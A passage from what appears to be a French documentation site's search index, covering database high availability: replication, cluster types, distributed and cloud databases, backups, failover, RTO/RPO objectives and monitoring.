d'une transaction sont ex\u00e9cut\u00e9es int\u00e9gralement ou pas du tout. Si une partie de la transaction \u00e9choue, l'ensemble des modifications est annul\u00e9.</p> <p>Coh\u00e9rence : Une transaction transforme l'\u00e9tat de la base de donn\u00e9es d'un \u00e9tat valide \u00e0 un autre \u00e9tat valide, maintenant les r\u00e8gles de validation d\u00e9finies.</p> <p>Isolation : Les op\u00e9rations d'une transaction sont isol\u00e9es des autres transactions en cours, \u00e9vitant ainsi les interf\u00e9rences.</p> <p>Durabilit\u00e9 : Une fois qu'une transaction est confirm\u00e9e (commit), les modifications apport\u00e9es sont permanentes, m\u00eame en cas de panne syst\u00e8me.</p> <ul> <li>Avantages : Maintien de l'int\u00e9grit\u00e9 des transactions et des donn\u00e9es.</li> <li>Limites : Peut n\u00e9cessiter une infrastructure robuste pour g\u00e9rer les volumes \u00e9lev\u00e9s de transactions.</li> </ul>"},{"location":"HD_BDD/#replication-de-table-complete","title":"R\u00e9plication de table compl\u00e8te","text":"<p>Une copie compl\u00e8te de la base de donn\u00e9es source est cr\u00e9\u00e9e sur le stockage cible.</p> <ul> <li>Avantages : Simplification de la gestion des donn\u00e9es.</li> <li>Limites : Peut n\u00e9cessiter beaucoup d'espace de stockage et de temps pour la synchronisation initiale.</li> </ul>"},{"location":"HD_BDD/#clustering","title":"Clustering","text":"<p>Dans le contexte des bases de donn\u00e9es et de la haute disponibilit\u00e9, plusieurs types de clusters peuvent \u00eatre utilis\u00e9s pour assurer la continuit\u00e9 du service.</p>"},{"location":"HD_BDD/#les-clusters-actifpassif","title":"Les clusters actif/passif","text":"<p>Ils permettent une bascule rapide en cas de d\u00e9faillance, avec un n\u0153ud passif pr\u00eat \u00e0 prendre le relais.</p> <ul> <li>Avantages : Haute disponibilit\u00e9, bascule rapide en cas de d\u00e9faillance.</li> <li>Inconv\u00e9nients : Sous-utilisation des ressources du n\u0153ud passif.</li> </ul>"},{"location":"HD_BDD/#les-clusters-actifactif","title":"Les clusters actif/actif","text":"<p>R\u00e9partissent la charge de travail entre plusieurs n\u0153uds actifs, am\u00e9liorant ainsi la performance et l'\u00e9volutivit\u00e9.</p> <ul> <li>Avantages : Am\u00e9lioration de la performance, r\u00e9partition de charge.</li> <li>Inconv\u00e9nients : Complexit\u00e9 de gestion accrue, synchronisation des donn\u00e9es.</li> </ul>"},{"location":"HD_BDD/#les-clusters-nud-principalsecondaire","title":"Les clusters n\u0153ud principal/secondaire","text":"<p>Combinent la haute disponibilit\u00e9 avec la r\u00e9partition des requ\u00eates en lecture.</p> <ul> <li>Avantages : Haute disponibilit\u00e9, r\u00e9partition des requ\u00eates en lecture.</li> <li>Inconv\u00e9nients : Complexit\u00e9 de configuration et de gestion.</li> </ul>"},{"location":"HD_BDD/#les-clusters-geographiquement-repartis","title":"Les clusters g\u00e9ographiquement r\u00e9partis","text":"<p>Offrent une r\u00e9silience mondiale en pla\u00e7ant des n\u0153uds dans diff\u00e9rentes r\u00e9gions pour r\u00e9duire la latence.</p> <ul> <li>Avantages : R\u00e9silience mondiale, r\u00e9duction de la latence.</li> <li>Inconv\u00e9nients : Complexit\u00e9 de synchronisation des donn\u00e9es, latence potentielle entre r\u00e9gions.</li> </ul>"},{"location":"HD_BDD/#les-clusters-de-replication","title":"Les clusters de r\u00e9plication","text":"<p>Assurent la coh\u00e9rence des donn\u00e9es en les r\u00e9pliquant entre plusieurs n\u0153uds. Chaque type de cluster pr\u00e9sente des avantages sp\u00e9cifiques et des d\u00e9fis en termes de gestion et de synchronisation des donn\u00e9es.</p> <ul> <li>Avantages : Tol\u00e9rance aux pannes, r\u00e9cup\u00e9ration rapide.</li> <li>Inconv\u00e9nients : Latence et complexit\u00e9 de gestion des conflits de donn\u00e9es.</li> </ul>"},{"location":"HD_BDD/#bases-de-donnees-distribuees","title":"Bases de donn\u00e9es distribu\u00e9es","text":"<p>Syst\u00e8me de gestion de bases de donn\u00e9es dans lequel les donn\u00e9es sont stock\u00e9es sur plusieurs serveurs physiques situ\u00e9s dans diff\u00e9rents emplacements g\u00e9ographiques. Ces serveurs communiquent et se synchronisent pour garantir la coh\u00e9rence des donn\u00e9es et permettre des acc\u00e8s simultan\u00e9s et fiables. Les bases de donn\u00e9es distribu\u00e9es offrent plusieurs avantages, notamment une meilleure disponibilit\u00e9, une tol\u00e9rance accrue aux pannes, et une performance am\u00e9lior\u00e9e gr\u00e2ce \u00e0 la r\u00e9partition de la charge de travail. Elles sont id\u00e9ales pour les applications n\u00e9cessitant une r\u00e9silience \u00e9lev\u00e9e et un acc\u00e8s rapide aux donn\u00e9es \u00e0 travers diff\u00e9rentes r\u00e9gions. Cependant, cela peut complexifier la gestion. Les bases de donn\u00e9es distribu\u00e9es n\u00e9cessitent une gestion plus complexe en raison de la synchronisation des donn\u00e9es entre plusieurs serveurs, la gestion des partitions, et la r\u00e9solution des conflits potentiels. Il faut aussi tenir compte de la latence accrue, la communication entre les serveurs situ\u00e9s dans diff\u00e9rentes r\u00e9gions g\u00e9ographiques peut introduire une latence suppl\u00e9mentaire, affectant les performances des applications sensibles au temps.</p>"},{"location":"HD_BDD/#exemple-doutils","title":"Exemple d\u2019outils","text":"<ul> <li>Cassandra : D\u00e9velopp\u00e9e par Apache, c'est une base de donn\u00e9es NoSQL distribu\u00e9e con\u00e7ue pour g\u00e9rer de grandes quantit\u00e9s de donn\u00e9es \u00e0 travers de nombreux serveurs sans point de d\u00e9faillance unique.</li> <li>MongoDB : Une base de donn\u00e9es NoSQL qui peut \u00eatre configur\u00e9e en clusters distribu\u00e9s pour g\u00e9rer des charges de travail \u00e0 grande \u00e9chelle et garantir la haute disponibilit\u00e9.</li> </ul>"},{"location":"HD_BDD/#bases-de-donnees-en-cloud","title":"Bases de donn\u00e9es en cloud","text":"<p>C\u2019est un service de gestion de bases de donn\u00e9es fourni et h\u00e9berg\u00e9 par des plateformes de cloud computing telles qu'Amazon Web Services (AWS), Microsoft Azure, ou Google Cloud Platform (GCP). Contrairement aux bases de donn\u00e9es traditionnelles install\u00e9es sur des serveurs locaux, les bases de donn\u00e9es cloud sont accessibles via Internet et offrent une infrastructure \u00e9volutive et flexible. Elles permettent un acc\u00e8s \u00e0 distance, une gestion simplifi\u00e9e, des sauvegardes automatiques, et une haute disponibilit\u00e9 gr\u00e2ce \u00e0 des m\u00e9canismes de redondance et de r\u00e9plication des donn\u00e9es. Ces bases de donn\u00e9es peuvent \u00eatre de type relationnel (SQL) ou non relationnel (NoSQL), en fonction des besoins de l'application ou de l'entreprise.</p> <p>Avantages :</p> <ul> <li>Scalabilit\u00e9 : Facilit\u00e9 d'ajuster les ressources en fonction des besoins changeants.</li> <li>Acc\u00e8s \u00e0 Distance : Acc\u00e8s aux bases de donn\u00e9es depuis n'importe o\u00f9 via Internet.</li> <li>Maintenance R\u00e9duite : Le fournisseur de services cloud g\u00e8re la maintenance, les mises \u00e0 jour et les sauvegardes.</li> <li>Co\u00fbt Efficace : Mod\u00e8le de paiement \u00e0 l'utilisation, r\u00e9duisant les co\u00fbts initiaux d'infrastructure.</li> <li>Haute Disponibilit\u00e9 : Redondance et r\u00e9cup\u00e9ration apr\u00e8s sinistre int\u00e9gr\u00e9es pour garantir la disponibilit\u00e9 continue.</li> </ul> <p>Inconv\u00e9nients :</p> <ul> <li>D\u00e9pendance au Fournisseur : Risque li\u00e9 \u00e0 la d\u00e9pendance envers un fournisseur de services sp\u00e9cifique.</li> <li>Latence : Potentielle latence due aux communications r\u00e9seau, particuli\u00e8rement pour les applications n\u00e9cessitant des temps de r\u00e9ponse rapides.</li> <li>S\u00e9curit\u00e9 des Donn\u00e9es : Pr\u00e9occupations concernant la confidentialit\u00e9 et la s\u00e9curit\u00e9 des donn\u00e9es h\u00e9berg\u00e9es \u00e0 l'ext\u00e9rieur de l'entreprise.</li> <li>Co\u00fbts \u00e0 Long Terme : Les co\u00fbts peuvent s'accumuler avec une utilisation prolong\u00e9e, surtout si les ressources ne sont pas optimis\u00e9es.</li> </ul> <p>Consid\u00e9rations :</p> <ul> <li>Choix du Fournisseur : Comparer les offres des diff\u00e9rents fournisseurs de services cloud pour trouver celle qui correspond le mieux aux besoins de l'entreprise.</li> <li>Conformit\u00e9 et R\u00e9glementations : S'assurer que les bases de donn\u00e9es respectent les r\u00e9glementations locales et internationales de protection des donn\u00e9es.</li> <li>Plan de Migration : Planifier soigneusement la migration des donn\u00e9es vers le cloud pour minimiser les interruptions.</li> <li>Strat\u00e9gie de s\u00e9curit\u00e9 : Mettre en place des mesures de s\u00e9curit\u00e9 robustes pour prot\u00e9ger les donn\u00e9es sensibles.</li> <li>Optimisation des ressources : Surveiller et ajuster r\u00e9guli\u00e8rement l'utilisation des ressources pour contr\u00f4ler les co\u00fbts.</li> </ul>"},{"location":"HD_BDD/#sauvegardes-et-restaurations","title":"Sauvegardes et restaurations","text":"<p>Pour garantir une haute disponibilit\u00e9 des bases de donn\u00e9es, il est essentiel de mettre en place une strat\u00e9gie de sauvegarde efficace et de bien comprendre les diff\u00e9rentes m\u00e9thodes de restauration. Voici un aper\u00e7u des principaux types de sauvegarde, des strat\u00e9gies de restauration et des bonnes pratiques :</p>"},{"location":"HD_BDD/#types-de-sauvegarde","title":"Types de Sauvegarde","text":"<ul> <li>Sauvegarde Compl\u00e8te : Copie int\u00e9grale de toutes les donn\u00e9es. Elle est simple \u00e0 restaurer mais prend beaucoup de temps et d'espace.</li> <li>Sauvegarde Incr\u00e9mentielle : Seules les donn\u00e9es modifi\u00e9es depuis la derni\u00e8re sauvegarde compl\u00e8te sont copi\u00e9es. Cela \u00e9conomise du temps et de l'espace mais rend la restauration plus complexe.</li> <li>Sauvegarde diff\u00e9rentielle : Seules les donn\u00e9es modifi\u00e9es depuis la derni\u00e8re sauvegarde compl\u00e8te sont copi\u00e9es, mais contrairement \u00e0 la sauvegarde incr\u00e9mentielle, elle inclut toutes les modifications depuis la derni\u00e8re sauvegarde compl\u00e8te.</li> </ul>"},{"location":"HD_BDD/#strategies-de-restauration","title":"Strat\u00e9gies de Restauration","text":"<ul> <li>Restauration \u00e0 partir de Sauvegarde Compl\u00e8te : La m\u00e9thode la plus simple mais la plus longue.</li> <li>Restauration \u00e0 partir de Sauvegarde Incr\u00e9mentielle : N\u00e9cessite la combinaison de la sauvegarde compl\u00e8te la plus r\u00e9cente avec toutes les sauvegardes incr\u00e9mentielles.</li> <li>Restauration \u00e0 partir de Sauvegarde Diff\u00e9rentielle : Similaire \u00e0 la restauration incr\u00e9mentielle mais utilise les sauvegardes diff\u00e9rentes.</li> </ul>"},{"location":"HD_BDD/#bonnes-pratiques-de-sauvegarde","title":"Bonnes Pratiques de Sauvegarde","text":"<ul> <li>Planification R\u00e9guli\u00e8re : Effectuer des sauvegardes r\u00e9guli\u00e8res pour minimiser les pertes de donn\u00e9es.</li> <li>Stockage Redondant : Utiliser plusieurs emplacements de stockage pour garantir la disponibilit\u00e9 des sauvegardes en cas de d\u00e9faillance mat\u00e9rielle.</li> <li>Test de Restauration : Tester r\u00e9guli\u00e8rement les sauvegardes pour s'assurer qu'elles peuvent \u00eatre restaur\u00e9es correctement.</li> <li>S\u00e9curit\u00e9 : Assurer que les sauvegardes sont chiffr\u00e9es et prot\u00e9g\u00e9es contre les acc\u00e8s non autoris\u00e9s.</li> <li>Documentation : Maintenir une documentation claire des proc\u00e9dures de sauvegarde et de restauration pour faciliter les op\u00e9rations en cas de besoin.</li> </ul>"},{"location":"HD_BDD/#failover-automatique","title":"Failover automatique","text":"<p>Le failover automatique pour les bases de donn\u00e9es est un processus cl\u00e9 pour assurer la continuit\u00e9 des op\u00e9rations en cas de panne. Il implique une surveillance continue du serveur principal, la d\u00e9tection de toute d\u00e9faillance, et la redirection automatique du trafic vers un serveur de secours. Cette transition se fait sans intervention humaine, garantissant une disponibilit\u00e9 maximale. Une fois le serveur principal r\u00e9par\u00e9, le syst\u00e8me peut basculer de nouveau les op\u00e9rations (failback).</p> <p>En ce qui concerne les solutions de failover, on distingue les logiciels tiers des logiciels int\u00e9gr\u00e9s.</p> <ul> <li>Logiciels tiers : offrent g\u00e9n\u00e9ralement plus de flexibilit\u00e9 et de personnalisation, \u00e9tant con\u00e7us pour s'adapter \u00e0 divers environnements. Cependant, ils peuvent n\u00e9cessiter une configuration plus complexe et engendrer des co\u00fbts suppl\u00e9mentaires.</li> <li>Logiciels int\u00e9gr\u00e9s : en revanche, sont d\u00e9velopp\u00e9s par les fournisseurs des bases de donn\u00e9es et sont donc optimis\u00e9s pour une compatibilit\u00e9 et une simplicit\u00e9 d'utilisation maximales. Bien qu'ils soient plus faciles \u00e0 configurer, ils peuvent offrir moins de flexibilit\u00e9 et de fonctionnalit\u00e9s avanc\u00e9es par rapport aux solutions tierces.</li> </ul>"},{"location":"HD_BDD/#criteres-de-choix-dune-solution","title":"Crit\u00e8res de choix d'une solution","text":""},{"location":"HD_BDD/#contexte-metier","title":"Contexte m\u00e9tier","text":"<p>Une analyse des processus critiques au sein de l\u2019architecture permet de calculer le risque de perte quantifiable li\u00e9 aux pannes informatiques planifi\u00e9es et non planifi\u00e9es affectant chacun de ces processus, et de mettre en \u00e9vidence les impacts moins tangibles de ces pannes. Il faut prendre en consid\u00e9ration les fonctions essentielles de l'entreprise, les ressources humaines et les syst\u00e8mes, les r\u00e9glementations et les d\u00e9pendances internes et externes de l'entreprise. Cette analyse s'appuie sur des donn\u00e9es objectives et subjectives recueillies lors d'entretiens avec du personnel comp\u00e9tent et exp\u00e9riment\u00e9, sur l'examen de l'historique des pratiques commerciales, sur des rapports financiers, sur des registres de syst\u00e8mes informatiques, etc.</p>"},{"location":"HD_BDD/#performance-et-scalabilite","title":"Performance et scalabilit\u00e9","text":"<p>L'impl\u00e9mentation de la haute disponibilit\u00e9 a souvent des implications sur les performances. L'entreprise doit d\u00e9terminer la technologie de r\u00e9silience des donn\u00e9es qu'elle va choisir en fonction de ses besoins.</p> <p>L'impl\u00e9mentation de la haute disponibilit\u00e9 a souvent des implications diverses sur les performances. La journalisation de la r\u00e9plication logique et les op\u00e9rations de la protection g\u00e9ographique par disque miroir n\u00e9cessitent des ressources syst\u00e8me pour permettre une ex\u00e9cution normale. En outre, la journalisation distante synchrone et la protection g\u00e9ographique par disque miroir en mode de livraison synchrone s'ex\u00e9cutent toutes en mode de communication synchrone. Ce mode synchrone g\u00e9n\u00e8re un temps d'attente qui varie selon la distance et la topologie de r\u00e9seau, avec des impacts sur l'environnement d'application. Les besoins de l'entreprise et les tests permettent de d\u00e9terminer la solution viable pour le client.</p> <p>La protection g\u00e9ographique par disque miroir prend aussi en charge un mode de livraison asynchrone qui peut n\u00e9cessiter des ressources suppl\u00e9mentaires (unit\u00e9 centrale, m\u00e9moire principale).</p> <p>Les op\u00e9rations de commutation et de reprise en ligne ne sont pas instantan\u00e9es et n\u00e9cessitent un certain temps syst\u00e8me. Chaque technologie a des caract\u00e9ristiques diff\u00e9rentes pour mettre en ligne un ensemble de donn\u00e9es ou l'environnement d'application tout entier.</p>"},{"location":"HD_BDD/#complexite-de-mise-en-uvre","title":"Complexit\u00e9 de mise en \u0153uvre","text":"<p>La mise en \u0153uvre de la haute disponibilit\u00e9 pour les bases de donn\u00e9es est une t\u00e2che complexe en raison de la diversit\u00e9 des technologies et des contraintes \u00e0 prendre en compte. Elle n\u00e9cessite une architecture soigneusement con\u00e7ue pour \u00e9viter les points de d\u00e9faillance uniques (SPOF) tout en assurant une synchronisation efficace des donn\u00e9es entre les n\u0153uds. La gestion des r\u00e9plications (synchrones ou asynchrones), des clusters et des m\u00e9canismes de basculement (failover) exige des comp\u00e9tences techniques \u00e9lev\u00e9es et des outils avanc\u00e9s. De plus, l'\u00e9quilibrage entre performance, coh\u00e9rence des donn\u00e9es et r\u00e9silience rend cette t\u00e2che encore plus d\u00e9licate. Cette complexit\u00e9 est accentu\u00e9e par la n\u00e9cessit\u00e9 d'int\u00e9grer des solutions de surveillance et d'automatisation pour minimiser l'intervention humaine et garantir une disponibilit\u00e9 continue, m\u00eame en cas de panne ou de maintenance.</p>"},{"location":"HD_BDD/#budget","title":"Budget","text":"<p>Chaque solution \u00e0 haute disponibilit\u00e9 implique un co\u00fbt. Son co\u00fbt doit \u00eatre compar\u00e9 aux avantages qu'elle apporte \u00e0 l'entreprise. Lorsque l'on demande aux clients quelle solution de haute disponibilit\u00e9 ils souhaitent, la plupart r\u00e9pondent qu'il veulent une disponibilit\u00e9 continue avec un temps d'indisponibilit\u00e9 nul. Bien que cela soit possible sur le plan technique, le co\u00fbt de la protection assur\u00e9e par une telle solution risque d'\u00eatre trop \u00e9lev\u00e9.</p> <p>La question essentielle qui se cache derri\u00e8re la quantit\u00e9 de ressources \u00e0 affecter \u00e0 une solution \u00e0 haute disponibilit\u00e9 est \u201cQuel est le co\u00fbt d'un temps d'indisponibilit\u00e9 ?\u201d. Les sites de sauvegarde, les syst\u00e8mes de secours et les copies de sauvegarde des donn\u00e9es des applications ont tous un co\u00fbt, mais aussi des avantages. Tant que vous ne connaissez pas le co\u00fbt r\u00e9el de chaque unit\u00e9 de temps d'indisponibilit\u00e9, il est impossible d'attribuer une valeur r\u00e9elle aux avantages apport\u00e9s au client par la solution \u00e0 haute disponibilit\u00e9.</p> <p>Le co\u00fbt de la solution est le co\u00fbt total de possession, qui comprend le co\u00fbt initial d'achat et de d\u00e9ploiement de la solution, ses co\u00fbts d'exploitation, et tous les impacts \u00e9ventuels en terme de rapport co\u00fbt/performance. Le co\u00fbt est en g\u00e9n\u00e9ral calcul\u00e9 sur la base d'une analyse minutieuse de l'impact sur l'entreprise. Plusieurs postulats de d\u00e9part influencent une telle analyse :</p> <ul> <li>Le facteur co\u00fbt n'entre pas en ligne de compte.</li> <li>Le co\u00fbt a une l\u00e9g\u00e8re incidence sur la d\u00e9cision.</li> <li>Sur la base d'une analyse des indisponibilit\u00e9s, le co\u00fbt de la solution doit respecter certaines contraintes budg\u00e9taires.</li> <li>Le co\u00fbt est un facteur important dans la d\u00e9cision.</li> <li>Le client rechigne \u00e0 consacrer des d\u00e9penses \u00e0 une solution de disponibilit\u00e9, ou ne peut pas se le permettre.</li> </ul>"},{"location":"HD_BDD/#objectifs-rto-et-rpo","title":"Objectifs RTO et RPO","text":"<p>L'objectif de temps de reprise (RTO) est le d\u00e9lai n\u00e9cessaire pour effectuer la reprise apr\u00e8s un arr\u00eat (planifi\u00e9, non planifi\u00e9 ou sinistre) et relancer le fonctionnement normal d'une application ou d'un ensemble d'applications.</p> <p>L'objectif de temps de reprise (RTO) peut \u00eatre diff\u00e9rent pour les arr\u00eats planifi\u00e9s, non planifi\u00e9s ou les sinistres. Les diff\u00e9rentes technologies de r\u00e9silience des donn\u00e9es ont des objectifs de temps de reprise diff\u00e9rents. Les valeurs possibles des objectifs de temps de reprise sont les suivantes :</p> <ul> <li>Plus de 4 jours si ce d\u00e9lai est acceptable</li> <li>1 \u00e0 4 jours</li> <li>Moins de 24 heures</li> <li>Moins de 4 heures</li> <li>Moins d'une heure</li> <li>Proche de z\u00e9ro (quasi-imm\u00e9diate)</li> </ul> <p>L'objectif de point de reprise (RPO) est le point de coh\u00e9rence jusqu'o\u00f9 vous devez pr\u00e9server les donn\u00e9es en cas de panne. Les modifications des donn\u00e9es pr\u00e9c\u00e9dant la panne ou le sinistre et qui interviennent au moins dans cette plage de temps sont pr\u00e9serv\u00e9es gr\u00e2ce au processus de reprise. La valeur z\u00e9ro est admise et \u00e9quivaut \u00e0 une exigence de \"perte de donn\u00e9es z\u00e9ro\".</p> <p>Les valeurs possibles de l'objectif de point de reprise (RPO) sont les suivantes :</p> <ul> <li>Derni\u00e8re sauvegarde (hebdomadaire, quotidienne...)</li> <li>D\u00e9but de la rotation de la derni\u00e8re \u00e9quipe de travail (8 heures)</li> <li>Derni\u00e8re interruption majeure (4 heures)</li> <li>Dernier lot de travail (1 heure \u00e0 plusieurs dizaines de minutes)</li> <li>Derni\u00e8re transaction (plusieurs secondes \u00e0 quelques minutes)</li> <li>Risque de pertes des modifications en cours (coh\u00e9rence avec la coupure d'alimentation)</li> <li>Z\u00e9ro perte de donn\u00e9es</li> </ul>"},{"location":"HD_BDD/#conformite","title":"Conformit\u00e9","text":"<p>La conformit\u00e9 dans le contexte de la haute disponibilit\u00e9 des bases de donn\u00e9es est essentielle pour r\u00e9pondre aux exigences r\u00e9glementaires et contractuelles sp\u00e9cifiques \u00e0 chaque secteur. Les entreprises doivent s'assurer que leurs syst\u00e8mes respectent les normes de protection des donn\u00e9es (comme le RGPD en Europe ou le CCPA aux \u00c9tats-Unis) et les politiques de disponibilit\u00e9 d\u00e9finies dans leurs accords de niveau de service (SLA). Cela implique la mise en \u0153uvre de mesures telles que la redondance g\u00e9ographique, le chiffrement des donn\u00e9es en transit et au repos, ainsi que des plans de reprise apr\u00e8s sinistre robustes. La non-conformit\u00e9 peut entra\u00eener des amendes co\u00fbteuses, des interruptions d'activit\u00e9 et une perte de confiance de la part des clients et des partenaires.</p>"},{"location":"HD_BDD/#ecosysteme-technologique-existant","title":"\u00c9cosyst\u00e8me technologique existant","text":"<p>L\u2019\u00e9cosyst\u00e8me technologique existant est un crit\u00e8re central dans le choix d\u2019une solution de haute disponibilit\u00e9 pour les bases de donn\u00e9es. La solution s\u00e9lectionn\u00e9e doit s'int\u00e9grer harmonieusement avec les outils, frameworks et infrastructures d\u00e9j\u00e0 en place pour limiter les co\u00fbts d'adaptation et acc\u00e9l\u00e9rer le d\u00e9ploiement. Par exemple, la compatibilit\u00e9 avec les syst\u00e8mes de gestion de bases de donn\u00e9es actuels (SQL ou NoSQL), les plateformes cloud utilis\u00e9es, et les outils de monitoring d\u00e9j\u00e0 en exploitation (comme Prometheus ou Datadog) est cruciale. De plus, il faut consid\u00e9rer l'expertise des \u00e9quipes en place pour \u00e9viter une courbe d'apprentissage trop abrupte. Une int\u00e9gration fluide garantit \u00e9galement une meilleure interop\u00e9rabilit\u00e9 entre les syst\u00e8mes, r\u00e9duisant ainsi le risque de conflits technologiques.</p>"},{"location":"HD_BDD/#impacts-sur-lexploitation","title":"Impacts sur l'exploitation","text":""},{"location":"HD_BDD/#ressources-humaines","title":"Ressources humaines","text":"<p>L\u2019introduction de solutions de haute disponibilit\u00e9 n\u00e9cessite des comp\u00e9tences sp\u00e9cifiques, notamment en gestion de clusters, r\u00e9plication, et strat\u00e9gies de failover. Les administrateurs de bases de donn\u00e9es (DBA) et les \u00e9quipes d\u2019exploitation doivent \u00eatre form\u00e9s pour g\u00e9rer des architectures plus complexes, ce qui peut impliquer des co\u00fbts initiaux en temps et en budget.</p> <p>La gestion des syst\u00e8mes haute disponibilit\u00e9 implique des t\u00e2ches suppl\u00e9mentaires, comme le monitoring renforc\u00e9, la gestion des sauvegardes en temps r\u00e9el et les tests r\u00e9guliers des m\u00e9canismes de basculement. Cela peut n\u00e9cessiter une r\u00e9organisation des \u00e9quipes ou l\u2019ajout de ressources humaines sp\u00e9cialis\u00e9es.</p>"},{"location":"HD_BDD/#complexite-accrue","title":"Complexit\u00e9 accrue","text":"<p>L\u2019ajout de m\u00e9canismes comme la r\u00e9plication des donn\u00e9es, les clusters de serveurs ou les configurations distribu\u00e9es rend les infrastructures plus complexes \u00e0 administrer. La coordination des n\u0153uds, le maintien de la coh\u00e9rence des donn\u00e9es et la gestion des conflits (par exemple, dans des syst\u00e8mes distribu\u00e9s) n\u00e9cessitent une attention continue.</p> <p>Effectuer des mises \u00e0 jour logicielles ou mat\u00e9rielles sans interruption de service (rolling upgrades) devient un d\u00e9fi majeur. Toute modification doit \u00eatre soigneusement planifi\u00e9e pour \u00e9viter de perturber les m\u00e9canismes de r\u00e9plication ou de failover.</p>"},{"location":"HD_BDD/#performance-et-latence","title":"Performance et latence","text":"<p>La r\u00e9plication synchrone, bien qu\u2019assurant une coh\u00e9rence stricte des donn\u00e9es, peut introduire une latence significative, surtout dans des environnements o\u00f9 les bases de donn\u00e9es sont g\u00e9ographiquement distribu\u00e9es. Cela peut affecter les performances des applications critiques.</p> <p>Pour limiter l\u2019impact sur la performance, il est souvent indispensable de configurer des index optimaux, de r\u00e9duire les requ\u00eates co\u00fbteuses et de mettre en \u0153uvre des caches adapt\u00e9s. Cela demande un effort suppl\u00e9mentaire de tuning.</p>"},{"location":"HD_BDD/#disponibilite-continue-et-gestion-des-pannes","title":"Disponibilit\u00e9 continue et gestion des pannes","text":"<p>Les bases de donn\u00e9es haute disponibilit\u00e9 doivent \u00eatre surveill\u00e9es en permanence pour d\u00e9tecter les anomalies avant qu\u2019elles n\u2019affectent le service. Cela n\u00e9cessite des outils de monitoring avanc\u00e9s, des alertes automatis\u00e9es et des tableaux de bord en temps r\u00e9el.</p> <p>Les m\u00e9canismes de basculement (failover) et de reprise apr\u00e8s sinistre (disaster recovery) doivent \u00eatre r\u00e9guli\u00e8rement test\u00e9s pour s\u2019assurer qu\u2019ils fonctionnent comme pr\u00e9vu. Cela peut inclure des simulations de panne ou l\u2019utilisation d\u2019approches comme le chaos engineering.</p> <p>Une mauvaise configuration ou une d\u00e9faillance dans la mise en \u0153uvre des m\u00e9canismes de haute disponibilit\u00e9 peut entra\u00eener des effets pervers, comme des interruptions plus longues ou des pertes de donn\u00e9es importantes.</p>"},{"location":"HD_BDD/#securite-et-conformite","title":"S\u00e9curit\u00e9 et conformit\u00e9","text":"<p>Dans des environnements de haute disponibilit\u00e9, il est crucial de s\u00e9curiser les communications entre les n\u0153uds pour pr\u00e9venir les acc\u00e8s non autoris\u00e9s. Les syst\u00e8mes doivent utiliser des protocoles s\u00e9curis\u00e9s (par ex. TLS) et des politiques strictes de gestion des identit\u00e9s et des permissions.</p> <p>Les bases de donn\u00e9es haute disponibilit\u00e9 doivent \u00e9galement se conformer aux exigences r\u00e9glementaires en mati\u00e8re de s\u00e9curit\u00e9 et de disponibilit\u00e9, ce qui peut impliquer des audits r\u00e9guliers et des rapports d\u2019activit\u00e9.</p>"},{"location":"HD_BDD/#cout-et-planification-budgetaire","title":"Co\u00fbt et planification budg\u00e9taire","text":"<p>La mise en place de solutions de haute disponibilit\u00e9, qu\u2019il s\u2019agisse de mat\u00e9riels redondants, de clusters distribu\u00e9s ou de services cloud manag\u00e9s, repr\u00e9sente un co\u00fbt initial \u00e9lev\u00e9.</p> <p>Ces syst\u00e8mes n\u00e9cessitent une maintenance continue, des ressources humaines qualifi\u00e9es et, dans le cas de services cloud, des abonnements pouvant varier selon les SLA choisis.</p> <p>Malgr\u00e9 ces co\u00fbts, la haute disponibilit\u00e9 peut r\u00e9duire les pertes financi\u00e8res li\u00e9es aux temps d\u2019arr\u00eat et am\u00e9liorer la satisfaction des utilisateurs.</p> <p>Bien que la haute disponibilit\u00e9 apporte des b\u00e9n\u00e9fices majeurs en termes de r\u00e9silience et de continuit\u00e9 de service, elle impose des d\u00e9fis op\u00e9rationnels significatifs. Ces impacts doivent \u00eatre anticip\u00e9s et g\u00e9r\u00e9s gr\u00e2ce \u00e0 une planification rigoureuse, une formation adapt\u00e9e et l\u2019utilisation d\u2019outils appropri\u00e9s pour \u00e9quilibrer les contraintes techniques et organisationnelles avec les b\u00e9n\u00e9fices attendus.</p>"},{"location":"HD_BDD/#supervision-et-maintenance","title":"Supervision et maintenance","text":"<p>La supervision et la maintenance jouent un r\u00f4le crucial dans la gestion des bases de donn\u00e9es haute disponibilit\u00e9 (HA). Ces processus permettent de garantir une disponibilit\u00e9 continue, de pr\u00e9venir les incidents avant qu\u2019ils ne deviennent critiques et d\u2019assurer une performance optimale. Voici les principaux aspects de cette partie.</p>"},{"location":"HD_BDD/#surveillance-proactive","title":"Surveillance proactive","text":"<p>La haute disponibilit\u00e9 repose sur une d\u00e9tection rapide des anomalies ou d\u00e9gradations. Une supervision proactive permet d\u2019identifier des probl\u00e8mes avant qu\u2019ils n\u2019impactent les utilisateurs.</p> <p>Cette surveillance va se r\u00e9aliser via un certain nombre d\u2019outil :</p> <ul> <li>Outils open source : Prometheus, Grafana, Nagios, Zabbix.</li> <li>Solutions propri\u00e9taires : Datadog, Dynatrace, New Relic.</li> </ul> <p>Ces outils collectent des m\u00e9triques cl\u00e9s telles que :</p> <ul> <li>Temps de r\u00e9ponse des requ\u00eates.</li> <li>Taux de r\u00e9plication r\u00e9ussi.</li> <li>Utilisation des ressources (CPU, RAM, disque).</li> <li>Sant\u00e9 des n\u0153uds dans un cluster.</li> </ul> <p>Les alertes permettent d\u2019avertir les \u00e9quipes en temps r\u00e9el en cas de d\u00e9passement de seuils critiques, comme une latence excessive, un n\u0153ud hors ligne ou une saturation du stockage.</p>"},{"location":"HD_BDD/#maintenance-preventive","title":"Maintenance pr\u00e9ventive","text":"<p>Les mises \u00e0 jour logicielles et mat\u00e9rielles sont essentielles pour corriger les vuln\u00e9rabilit\u00e9s, am\u00e9liorer les performances et int\u00e9grer de nouvelles fonctionnalit\u00e9s. Pour les syst\u00e8mes HA :</p> <ul> <li>Utilisation de techniques de rolling upgrades pour minimiser les interruptions.</li> <li>Tests des mises \u00e0 jour sur des environnements de staging avant leur d\u00e9ploiement en production.</li> </ul> <p>La maintenance r\u00e9guli\u00e8re inclut la suppression ou l\u2019archivage des donn\u00e9es obsol\u00e8tes, la r\u00e9indexation des tables et l'optimisation des requ\u00eates. Ces t\u00e2ches r\u00e9duisent la charge sur les bases de donn\u00e9es et am\u00e9liorent leurs performances.</p> <p>V\u00e9rifier r\u00e9guli\u00e8rement la validit\u00e9 des sauvegardes est indispensable. Cela inclut des restaurations simul\u00e9es pour s'assurer que les donn\u00e9es sont r\u00e9cup\u00e9rables en cas d\u2019incident.</p>"},{"location":"HD_BDD/#gestion-des-incidents","title":"Gestion des incidents","text":"<p>Les outils de supervision d\u00e9tectent les pannes 